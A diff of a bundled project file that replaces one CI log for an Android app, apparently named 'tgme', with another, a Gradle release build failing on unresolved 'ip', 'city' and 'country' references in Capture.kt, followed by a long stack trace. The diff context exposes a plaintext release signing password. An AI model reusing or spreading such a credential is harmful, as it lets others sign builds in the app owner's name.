@@ -978,20 +978,287 @@ RELEASE_KEY_PASSWORD=tgme1234
 FICHIER : log.txt
 ================================================================================
 
-build	Vérifier les ABI	﻿2026-10-27T09:28:21.6988073Z ##[group]Run APK=$(ls app/build/outputs/apk/release/*.apk | head -1)
-build	Vérifier les ABI	2026-10-27T09:28:21.6988415Z ^[[36;1mAPK=$(ls app/build/outputs/apk/release/*.apk | head -1)^[[0m
-build	Vérifier les ABI	2026-10-27T09:28:21.6988630Z ^[[36;1munzip -l "$APK" | grep 'lib/'^[[0m
-build	Vérifier les ABI	2026-10-27T09:28:21.6988973Z ^[[36;1mfor a in arm64-v8a armeabi-v7a; do^[[0m
-build	Vérifier les ABI	2026-10-27T09:28:21.6989222Z ^[[36;1m  unzip -l "$APK" | grep -q "lib/$a/" || { echo "ABI manquante: $a"; exit 1; }^[[0m
-build	Vérifier les ABI	2026-10-27T09:28:21.6989464Z ^[[36;1mdone^[[0m
-build	Vérifier les ABI	2026-10-27T09:28:21.7042981Z shell: /usr/bin/bash -e {0}
-build	Vérifier les ABI	2026-10-27T09:28:21.7043141Z env:
-build	Vérifier les ABI	2026-10-27T09:28:21.7043326Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
-build	Vérifier les ABI	2026-10-27T09:28:21.7043606Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
-build	Vérifier les ABI	2026-10-27T09:28:21.7043822Z ##[endgroup]
-build	Vérifier les ABI	2026-10-27T09:28:21.7132001Z ls: cannot access 'app/build/outputs/apk/release/*.apk': No such file or directory
-build	Vérifier les ABI	2026-10-27T09:28:21.7159390Z unzip:  cannot find or open , .zip or .ZIP.
-build	Vérifier les ABI	2026-10-27T09:28:21.7166406Z ##[error]Process completed with exit code 1.
+build	Build APK release signé	﻿2026-10-27T11:31:04.6250606Z ##[group]Run ./gradlew assembleRelease --stacktrace
+build	Build APK release signé	2026-10-27T11:31:04.6250880Z ^[[36;1m./gradlew assembleRelease --stacktrace^[[0m
+build	Build APK release signé	2026-10-27T11:31:04.6302340Z shell: /usr/bin/bash -e {0}
+build	Build APK release signé	2026-10-27T11:31:04.6302706Z env:
+build	Build APK release signé	2026-10-27T11:31:04.6302881Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+build	Build APK release signé	2026-10-27T11:31:04.6303186Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+build	Build APK release signé	2026-10-27T11:31:04.6303407Z ##[endgroup]
+build	Build APK release signé	2026-10-27T11:31:04.7035409Z Fetching distribution.
+build	Build APK release signé	2026-10-27T11:31:04.7038440Z Downloading https://services.gradle.org/distributions/gradle-8.7-bin.zip
+build	Build APK release signé	2026-10-27T11:31:05.7065144Z ............10%.............20%.............30%.............40%............50%.............60%.............70%.............80%.............90%............100%
+build	Build APK release signé	2026-10-27T11:31:06.5222308Z 
+build	Build APK release signé	2026-10-27T11:31:06.5223260Z Welcome to Gradle 8.7!
+build	Build APK release signé	2026-10-27T11:31:06.5223896Z 
+build	Build APK release signé	2026-10-27T11:31:06.5224192Z Here are the highlights of this release:
+build	Build APK release signé	2026-10-27T11:31:06.5224831Z  - Compiling and testing with Java 22
+build	Build APK release signé	2026-10-27T11:31:06.5225248Z  - Cacheable Groovy script compilation
+build	Build APK release signé	2026-10-27T11:31:06.5225819Z  - New methods in lazy collection properties
+build	Build APK release signé	2026-10-27T11:31:06.5226234Z 
+build	Build APK release signé	2026-10-27T11:31:06.5227452Z For more details see https://docs.gradle.org/8.7/release-notes.html
+build	Build APK release signé	2026-10-27T11:31:06.5227801Z 
+build	Build APK release signé	2026-10-27T11:31:06.6221035Z Starting a Gradle Daemon (subsequent builds will be faster)
+build	Build APK release signé	2026-10-27T11:31:48.8233334Z > Task :app:buildKotlinToolingMetadata
+build	Build APK release signé	2026-10-27T11:31:48.8234070Z > Task :app:checkKotlinGradlePluginConfigurationErrors
+build	Build APK release signé	2026-10-27T11:31:48.8234623Z > Task :app:preBuild UP-TO-DATE
+build	Build APK release signé	2026-10-27T11:31:48.8248549Z > Task :app:preReleaseBuild UP-TO-DATE
+build	Build APK release signé	2026-10-27T11:31:50.6246118Z > Task :app:generateReleaseResValues
+build	Build APK release signé	2026-10-27T11:31:50.7219600Z > Task :app:checkReleaseAarMetadata
+build	Build APK release signé	2026-10-27T11:31:50.7232569Z > Task :app:mapReleaseSourceSetPaths
+build	Build APK release signé	2026-10-27T11:31:50.7233468Z > Task :app:generateReleaseResources
+build	Build APK release signé	2026-10-27T11:31:50.9218184Z > Task :app:packageReleaseResources
+build	Build APK release signé	2026-10-27T11:31:50.9219193Z > Task :app:mergeReleaseResources
+build	Build APK release signé	2026-10-27T11:31:52.0263092Z > Task :app:createReleaseCompatibleScreenManifests
+build	Build APK release signé	2026-10-27T11:31:52.0267808Z > Task :app:extractDeepLinksRelease
+build	Build APK release signé	2026-10-27T11:31:52.1232971Z > Task :app:parseReleaseLocalResources
+build	Build APK release signé	2026-10-27T11:31:52.1262988Z > Task :app:processReleaseMainManifest
+build	Build APK release signé	2026-10-27T11:31:52.2217437Z > Task :app:processReleaseManifest
+build	Build APK release signé	2026-10-27T11:31:52.2217864Z > Task :app:javaPreCompileRelease
+build	Build APK release signé	2026-10-27T11:31:52.2218031Z > Task :app:extractProguardFiles
+build	Build APK release signé	2026-10-27T11:31:52.2218197Z > Task :app:mergeReleaseJniLibFolders
+build	Build APK release signé	2026-10-27T11:31:52.5217566Z > Task :app:mergeReleaseNativeLibs
+build	Build APK release signé	2026-10-27T11:31:52.6254044Z > Task :app:checkReleaseDuplicateClasses
+build	Build APK release signé	2026-10-27T11:31:52.6272563Z > Task :app:desugarReleaseFileDependencies
+build	Build APK release signé	2026-10-27T11:31:52.6272955Z > Task :app:mergeReleaseStartupProfile
+build	Build APK release signé	2026-10-27T11:31:53.7222854Z 
+build	Build APK release signé	2026-10-27T11:31:53.7237335Z > Task :app:stripReleaseDebugSymbols
+build	Build APK release signé	2026-10-27T11:31:53.7262797Z Unable to strip the following libraries, packaging them as they are: libtdjni.so.
+build	Build APK release signé	2026-10-27T11:31:59.6218156Z 
+build	Build APK release signé	2026-10-27T11:31:59.6235479Z > Task :app:processReleaseManifestForPackage
+build	Build APK release signé	2026-10-27T11:31:59.6263325Z > Task :app:mergeReleaseArtProfile
+build	Build APK release signé	2026-10-27T11:31:59.6263936Z > Task :app:extractReleaseNativeSymbolTables
+build	Build APK release signé	2026-10-27T11:32:00.1258076Z > Task :app:mergeReleaseNativeDebugMetadata NO-SOURCE
+build	Build APK release signé	2026-10-27T11:32:00.1312794Z > Task :app:mergeReleaseShaders
+build	Build APK release signé	2026-10-27T11:32:00.1352914Z > Task :app:compileReleaseShaders NO-SOURCE
+build	Build APK release signé	2026-10-27T11:32:00.1395836Z > Task :app:generateReleaseAssets UP-TO-DATE
+build	Build APK release signé	2026-10-27T11:32:00.2253035Z > Task :app:mergeReleaseAssets
+build	Build APK release signé	2026-10-27T11:32:00.2272496Z > Task :app:compressReleaseAssets
+build	Build APK release signé	2026-10-27T11:32:00.3217865Z > Task :app:processReleaseResources
+build	Build APK release signé	2026-10-27T11:32:00.3218313Z > Task :app:extractReleaseVersionControlInfo
+build	Build APK release signé	2026-10-27T11:32:00.9223127Z > Task :app:mergeExtDexRelease
+build	Build APK release signé	2026-10-27T11:32:02.5223897Z > Task :app:collectReleaseDependencies
+build	Build APK release signé	2026-10-27T11:32:02.6219511Z > Task :app:sdkReleaseDependencyData
+build	Build APK release signé	2026-10-27T11:32:02.6247469Z > Task :app:optimizeReleaseResources
+build	Build APK release signé	2026-10-27T11:32:02.6266102Z > Task :app:validateSigningRelease
+build	Build APK release signé	2026-10-27T11:32:02.6302531Z > Task :app:writeReleaseAppMetadata
+build	Build APK release signé	2026-10-27T11:32:02.6332477Z > Task :app:writeReleaseSigningConfigVersions
+build	Build APK release signé	2026-10-27T11:32:06.6310462Z e: file:///home/runner/work/tgme/tgme/app/src/main/java/com/tgme/app/Capture.kt:126:66 Unresolved reference: ip
+build	Build APK release signé	2026-10-27T11:32:06.6310973Z 
+build	Build APK release signé	2026-10-27T11:32:06.6312345Z > Task :app:compileReleaseKotlin FAILED
+build	Build APK release signé	2026-10-27T11:32:06.6352994Z e: file:///home/runner/work/tgme/tgme/app/src/main/java/com/tgme/app/Capture.kt:126:74 Unresolved reference: city
+build	Build APK release signé	2026-10-27T11:32:06.6353628Z 37 actionable tasks: 37 executed
+build	Build APK release signé	2026-10-27T11:32:06.6382943Z e: file:///home/runner/work/tgme/tgme/app/src/main/java/com/tgme/app/Capture.kt:126:84 Unresolved reference: country
+build	Build APK release signé	2026-10-27T11:32:06.6383443Z 
+build	Build APK release signé	2026-10-27T11:32:06.6383564Z FAILURE: Build failed with an exception.
+build	Build APK release signé	2026-10-27T11:32:06.6383798Z 
+build	Build APK release signé	2026-10-27T11:32:06.6383892Z * What went wrong:
+build	Build APK release signé	2026-10-27T11:32:06.6384168Z Execution failed for task ':app:compileReleaseKotlin'.
+build	Build APK release signé	2026-10-27T11:32:06.6384898Z > A failure occurred while executing org.jetbrains.kotlin.compilerRunner.GradleCompilerRunnerWithWorkers$GradleKotlinCompilerWorkAction
+build	Build APK release signé	2026-10-27T11:32:06.6385576Z    > Compilation error. See log for more details
+build	Build APK release signé	2026-10-27T11:32:06.6385774Z 
+build	Build APK release signé	2026-10-27T11:32:06.6385856Z * Try:
+build	Build APK release signé	2026-10-27T11:32:06.6386115Z > Run with --info or --debug option to get more log output.
+build	Build APK release signé	2026-10-27T11:32:06.6386450Z > Run with --scan to get full insights.
+build	Build APK release signé	2026-10-27T11:32:06.6386755Z > Get more help at https://help.gradle.org.
+build	Build APK release signé	2026-10-27T11:32:06.6386949Z 
+build	Build APK release signé	2026-10-27T11:32:06.6387033Z * Exception is:
+build	Build APK release signé	2026-10-27T11:32:06.6387438Z org.gradle.api.tasks.TaskExecutionException: Execution failed for task ':app:compileReleaseKotlin'.
+build	Build APK release signé	2026-10-27T11:32:06.6388263Z 	at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.lambda$executeIfValid$1(ExecuteActionsTaskExecuter.java:130)
+build	Build APK release signé	2026-10-27T11:32:06.6388933Z 	at org.gradle.internal.Try$Failure.ifSuccessfulOrElse(Try.java:282)
+build	Build APK release signé	2026-10-27T11:32:06.6389580Z 	at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:128)
+build	Build APK release signé	2026-10-27T11:32:06.6390431Z 	at org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:116)
+build	Build APK release signé	2026-10-27T11:32:06.6391302Z 	at org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46)
+build	Build APK release signé	2026-10-27T11:32:06.6392331Z 	at org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:51)
+build	Build APK release signé	2026-10-27T11:32:06.6393243Z 	at org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57)
+build	Build APK release signé	2026-10-27T11:32:06.6394093Z 	at org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:74)
+build	Build APK release signé	2026-10-27T11:32:06.6394954Z 	at org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36)
+build	Build APK release signé	2026-10-27T11:32:06.6395752Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77)
+build	Build APK release signé	2026-10-27T11:32:06.6396539Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55)
+build	Build APK release signé	2026-10-27T11:32:06.6397276Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52)
+build	Build APK release signé	2026-10-27T11:32:06.6398176Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:200)
+build	Build APK release signé	2026-10-27T11:32:06.6399203Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:195)
+build	Build APK release signé	2026-10-27T11:32:06.6400114Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)
+build	Build APK release signé	2026-10-27T11:32:06.6401426Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6402326Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)
+build	Build APK release signé	2026-10-27T11:32:06.6403388Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6404233Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)
+build	Build APK release signé	2026-10-27T11:32:06.6405159Z 	at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)
+build	Build APK release signé	2026-10-27T11:32:06.6406013Z 	at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52)
+build	Build APK release signé	2026-10-27T11:32:06.6406785Z 	at org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:42)
+build	Build APK release signé	2026-10-27T11:32:06.6407637Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:331)
+build	Build APK release signé	2026-10-27T11:32:06.6408683Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:318)
+build	Build APK release signé	2026-10-27T11:32:06.6409744Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.lambda$execute$0(DefaultTaskExecutionGraph.java:314)
+build	Build APK release signé	2026-10-27T11:32:06.6410605Z 	at org.gradle.internal.operations.CurrentBuildOperationRef.with(CurrentBuildOperationRef.java:80)
+build	Build APK release signé	2026-10-27T11:32:06.6411202Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:314)
+build	Build APK release signé	2026-10-27T11:32:06.6411802Z 	at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:303)
+build	Build APK release signé	2026-10-27T11:32:06.6423163Z 	at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:463)
+build	Build APK release signé	2026-10-27T11:32:06.6423903Z 	at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:380)
+build	Build APK release signé	2026-10-27T11:32:06.6424558Z 	at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)
+build	Build APK release signé	2026-10-27T11:32:06.6425239Z 	at org.gradle.internal.concurrent.AbstractManagedExecutor$1.run(AbstractManagedExecutor.java:47)
+build	Build APK release signé	2026-10-27T11:32:06.6426322Z Caused by: org.gradle.workers.internal.DefaultWorkerExecutor$WorkExecutionException: A failure occurred while executing org.jetbrains.kotlin.compilerRunner.GradleCompilerRunnerWithWorkers$GradleKotlinCompilerWorkAction
+build	Build APK release signé	2026-10-27T11:32:06.6427537Z 	at org.gradle.workers.internal.DefaultWorkerExecutor$WorkItemExecution.waitForCompletion(DefaultWorkerExecutor.java:287)
+build	Build APK release signé	2026-10-27T11:32:06.6428412Z 	at org.gradle.internal.work.DefaultAsyncWorkTracker.lambda$waitForItemsAndGatherFailures$2(DefaultAsyncWorkTracker.java:130)
+build	Build APK release signé	2026-10-27T11:32:06.6429083Z 	at org.gradle.internal.Factories$1.create(Factories.java:31)
+build	Build APK release signé	2026-10-27T11:32:06.6429701Z 	at org.gradle.internal.work.DefaultWorkerLeaseService.withoutLocks(DefaultWorkerLeaseService.java:336)
+build	Build APK release signé	2026-10-27T11:32:06.6430461Z 	at org.gradle.internal.work.DefaultWorkerLeaseService.withoutLocks(DefaultWorkerLeaseService.java:319)
+build	Build APK release signé	2026-10-27T11:32:06.6431228Z 	at org.gradle.internal.work.DefaultWorkerLeaseService.withoutLock(DefaultWorkerLeaseService.java:324)
+build	Build APK release signé	2026-10-27T11:32:06.6432277Z 	at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForItemsAndGatherFailures(DefaultAsyncWorkTracker.java:126)
+build	Build APK release signé	2026-10-27T11:32:06.6433183Z 	at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForItemsAndGatherFailures(DefaultAsyncWorkTracker.java:92)
+build	Build APK release signé	2026-10-27T11:32:06.6433989Z 	at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForAll(DefaultAsyncWorkTracker.java:78)
+build	Build APK release signé	2026-10-27T11:32:06.6434722Z 	at org.gradle.internal.work.DefaultAsyncWorkTracker.waitForCompletion(DefaultAsyncWorkTracker.java:66)
+build	Build APK release signé	2026-10-27T11:32:06.6435393Z 	at org.gradle.api.internal.tasks.execution.TaskExecution$3.run(TaskExecution.java:252)
+build	Build APK release signé	2026-10-27T11:32:06.6436416Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$1.execute(DefaultBuildOperationRunner.java:29)
+build	Build APK release signé	2026-10-27T11:32:06.6437345Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$1.execute(DefaultBuildOperationRunner.java:26)
+build	Build APK release signé	2026-10-27T11:32:06.6438122Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)
+build	Build APK release signé	2026-10-27T11:32:06.6438902Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6439701Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)
+build	Build APK release signé	2026-10-27T11:32:06.6440558Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6441519Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.run(DefaultBuildOperationRunner.java:47)
+build	Build APK release signé	2026-10-27T11:32:06.6442461Z 	at org.gradle.internal.operations.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:68)
+build	Build APK release signé	2026-10-27T11:32:06.6443211Z 	at org.gradle.api.internal.tasks.execution.TaskExecution.executeAction(TaskExecution.java:229)
+build	Build APK release signé	2026-10-27T11:32:06.6443914Z 	at org.gradle.api.internal.tasks.execution.TaskExecution.executeActions(TaskExecution.java:212)
+build	Build APK release signé	2026-10-27T11:32:06.6444702Z 	at org.gradle.api.internal.tasks.execution.TaskExecution.executeWithPreviousOutputFiles(TaskExecution.java:195)
+build	Build APK release signé	2026-10-27T11:32:06.6445451Z 	at org.gradle.api.internal.tasks.execution.TaskExecution.execute(TaskExecution.java:162)
+build	Build APK release signé	2026-10-27T11:32:06.6446093Z 	at org.gradle.internal.execution.steps.ExecuteStep.executeInternal(ExecuteStep.java:105)
+build	Build APK release signé	2026-10-27T11:32:06.6446715Z 	at org.gradle.internal.execution.steps.ExecuteStep.access$000(ExecuteStep.java:44)
+build	Build APK release signé	2026-10-27T11:32:06.6447284Z 	at org.gradle.internal.execution.steps.ExecuteStep$1.call(ExecuteStep.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6447830Z 	at org.gradle.internal.execution.steps.ExecuteStep$1.call(ExecuteStep.java:56)
+build	Build APK release signé	2026-10-27T11:32:06.6448632Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:200)
+build	Build APK release signé	2026-10-27T11:32:06.6449690Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:195)
+build	Build APK release signé	2026-10-27T11:32:06.6450628Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)
+build	Build APK release signé	2026-10-27T11:32:06.6451446Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6452441Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)
+build	Build APK release signé	2026-10-27T11:32:06.6453272Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)
+build	Build APK release signé	2026-10-27T11:32:06.6454132Z 	at org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)
+build	Build APK release signé	2026-10-27T11:32:06.6454934Z 	at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)
+build	Build APK release signé	2026-10-27T11:32:06.6455651Z 	at org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:56)
+build	Build APK release signé	2026-10-27T11:32:06.6456260Z 	at org.gradle.internal.execution.steps.ExecuteStep.execute(ExecuteStep.java:44)
+build	Build APK release signé	2026-10-27T11:32:06.6456940Z 	at org.gradle.internal.execution.steps.CancelExecutionStep.execute(CancelExecutionStep.java:41)
+build	Build APK release signé	2026-10-27T11:32:06.6457653Z 	at org.gradle.internal.execution.steps.TimeoutStep.executeWithoutTimeout(TimeoutStep.java:74)
+build	Build APK release signé	2026-10-27T11:32:06.6458331Z 	at org.gradle.internal.execution.steps.TimeoutStep.execute(TimeoutStep.java:55)
+build	Build APK release signé	2026-10-27T11:32:06.6459079Z 	at org.gradle.internal.execution.steps.PreCreateOutputParentsStep.execute(PreCreateOutputParentsStep.java:50)
+build	Build APK release signé	2026-10-27T11:32:06.6459938Z 	at org.gradle.internal.execution.steps.PreCreateOutputParentsStep.execute(PreCreateOutputParentsStep.java:28)
+build	Build APK release signé	2026-10-27T11:32:06.6461103Z 	at org.gradle.internal.execution.steps.RemovePreviousOutputsStep.execute(RemovePreviousOutputsStep.java:67)
+build	Build APK release signé	2026-10-27T11:32:06.6462089Z 	at org.gradle.internal.execution.steps.RemovePreviousOutputsStep.execute(RemovePreviousOutputsStep.java:37)
+build	Build APK release signé	2026-10-27T11:32:06.6463166Z 	at org.gradle.internal.execution.steps.BroadcastChangingOutputsStep.execute(BroadcastChangingOutputsStep.java:61)
+build	Build APK release signé	2026-10-27T11:32:06.6464093Z 	at org.gradle.internal.execution.steps.BroadcastChangingOutputsStep.execute(BroadcastChangingOutputsStep.java:26)
+build	Build APK release signé	2026-10-27T11:32:06.6465025Z 	at org.gradle.internal.execution.steps.CaptureOutputsAfterExecutionStep.execute(CaptureOutputsAfterExecutionStep.java:67)
+build	Build APK release signé	2026-10-27T11:32:06.6465953Z 	at org.gradle.internal.execution.steps.CaptureOutputsAfterExecutionStep.execute(CaptureOutputsAfterExecutionStep.java:45)
+build	Build APK release signé	2026-10-27T11:32:06.6466814Z 	at org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:40)
+build	Build APK release signé	2026-10-27T11:32:06.6467592Z 	at org.gradle.internal.execution.steps.ResolveInputChangesStep.execute(ResolveInputChangesStep.java:29)
+build	Build APK release signé	2026-10-27T11:32:06.6468344Z 	at org.gradle.internal.execution.steps.BuildCacheStep.executeWithoutCache(BuildCacheStep.java:189)
+build	Build APK release signé	2026-10-27T11:32:06.6469077Z 	at org.gradle.internal.execution.steps.BuildCacheStep.lambda$execute$1(BuildCacheStep.java:75)
+build	Build APK release signé	2026-10-27T11:32:06.6469621Z 	at org.gradle.internal.Either$Right.fold(Either.java:175)
+build	Build APK release signé	2026-10-27T11:32:06.6470103Z 	at org.gradle.internal.execution.caching.CachingState.fold(CachingState.java:62)
+build	Build APK release signé	2026-10-27T11:32:06.6470700Z 	at org.gradle.internal.execution.steps.BuildCacheStep.execute(BuildCacheStep.java:73)
+build	Build APK release signé	2026-10-27T11:32:06.6471320Z 	at org.gradle.internal.execution.steps.BuildCacheStep.execute(BuildCacheStep.java:48)
+build	Build APK release signé	2026-10-27T11:32:06.6472206Z 	at org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:46)
+build	Build APK release signé	2026-10-27T11:32:06.6472971Z 	at org.gradle.internal.execution.steps.StoreExecutionStateStep.execute(StoreExecutionStateStep.java:35)
+build	Build APK release signé	2026-10-27T11:32:06.6473749Z 	at org.gradle.internal.execution.steps.SkipUpToDateStep.executeBecause(SkipUpToDateStep.java:76)
+build	Build APK release signé	2026-10-27T11:32:06.6474473Z 	at org.gradle.internal.execution.steps.SkipUpToDateStep.lambda$execute$2(SkipUpToDateStep.java:54)
+build	Build APK release signé	2026-10-27T11:32:06.6475188Z 	at org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:54)
+build	Build APK release signé	2026-10-27T11:32:06.6475867Z 	at org.gradle.internal.execution.steps.SkipUpToDateStep.execute(SkipUpToDateStep.java:36)
+build	Build APK release signé	2026-10-27T11:32:06.6476733Z 	at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:37)
+build	Build APK release signé	2026-10-27T11:32:06.6477777Z 	at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsFinishedStep.execute(MarkSnapshottingInputsFinishedStep.java:27)
+build	Build APK release signé	2026-10-27T11:32:06.6478890Z 	at org.gradle.internal.execution.steps.ResolveIncrementalCachingStateStep.executeDelegate(ResolveIncrementalCachingStateStep.java:49)
+build	Build APK release signé	2026-10-27T11:32:06.6480024Z 	at org.gradle.internal.execution.steps.ResolveIncrementalCachingStateStep.executeDelegate(ResolveIncrementalCachingStateStep.java:27)
+build	Build APK release signé	2026-10-27T11:32:06.6481068Z 	at org.gradle.internal.execution.steps.AbstractResolveCachingStateStep.execute(AbstractResolveCachingStateStep.java:71)
+build	Build APK release signé	2026-10-27T11:32:06.6482143Z 	at org.gradle.internal.execution.steps.AbstractResolveCachingStateStep.execute(AbstractResolveCachingStateStep.java:39)
+build	Build APK release signé	2026-10-27T11:32:06.6482953Z 	at org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:65)
+build	Build APK release signé	2026-10-27T11:32:06.6483632Z 	at org.gradle.internal.execution.steps.ResolveChangesStep.execute(ResolveChangesStep.java:36)
+build	Build APK release signé	2026-10-27T11:32:06.6484272Z 	at org.gradle.internal.execution.steps.ValidateStep.execute(ValidateStep.java:106)
+build	Build APK release signé	2026-10-27T11:32:06.6484857Z 	at org.gradle.internal.execution.steps.ValidateStep.execute(ValidateStep.java:55)
+build	Build APK release signé	2026-10-27T11:32:06.6485689Z 	at org.gradle.internal.execution.steps.AbstractCaptureStateBeforeExecutionStep.execute(AbstractCaptureStateBeforeExecutionStep.java:64)
+build	Build APK release signé	2026-10-27T11:32:06.6488352Z 	at org.gradle.internal.execution.steps.AbstractCaptureStateBeforeExecutionStep.execute(AbstractCaptureStateBeforeExecutionStep.java:43)
+build	Build APK release signé	2026-10-27T11:32:06.6489538Z 	at org.gradle.internal.execution.steps.AbstractSkipEmptyWorkStep.executeWithNonEmptySources(AbstractSkipEmptyWorkStep.java:125)
+build	Build APK release signé	2026-10-27T11:32:06.6490482Z 	at org.gradle.internal.execution.steps.AbstractSkipEmptyWorkStep.execute(AbstractSkipEmptyWorkStep.java:61)
+build	Build APK release signé	2026-10-27T11:32:06.6491298Z 	at org.gradle.internal.execution.steps.AbstractSkipEmptyWorkStep.execute(AbstractSkipEmptyWorkStep.java:36)
+build	Build APK release signé	2026-10-27T11:32:06.6492362Z 	at org.gradle.internal.execution.steps.legacy.MarkSnapshottingInputsStartedStep.execute(MarkSnapshottingInputsStartedStep.java:38)
+build	Build APK release signé	2026-10-27T11:32:06.6493292Z 	at org.gradle.internal.execution.steps.LoadPreviousExecutionStateStep.execute(LoadPreviousExecutionStateStep.java:36)
+build	Build APK release signé	2026-10-27T11:32:06.6494126Z 	at org.gradle.internal.execution.steps.LoadPreviousExecutionStateStep.execute(LoadPreviousExecutionStateStep.java:23)
+build	Build APK release signé	2026-10-27T11:32:06.6494910Z 	at org.gradle.internal.execution.steps.HandleStaleOutputsStep.execute(HandleStaleOutputsStep.java:75)
+build	Build APK release signé	2026-10-27T11:32:06.6495667Z 	at org.gradle.internal.execution.steps.HandleStaleOutputsStep.execute(HandleStaleOutputsStep.java:41)
+build	Build APK release signé	2026-10-27T11:32:06.6496457Z 	at org.gradle.internal.execution.steps.AssignMutableWorkspaceStep.lambda$execute$0(AssignMutableWorkspaceStep.java:35)
+build	Build APK release signé	2026-10-27T11:32:06.6497226Z 	at org.gradle.api.internal.tasks.execution.TaskExecution$4.withWorkspace(TaskExecution.java:289)
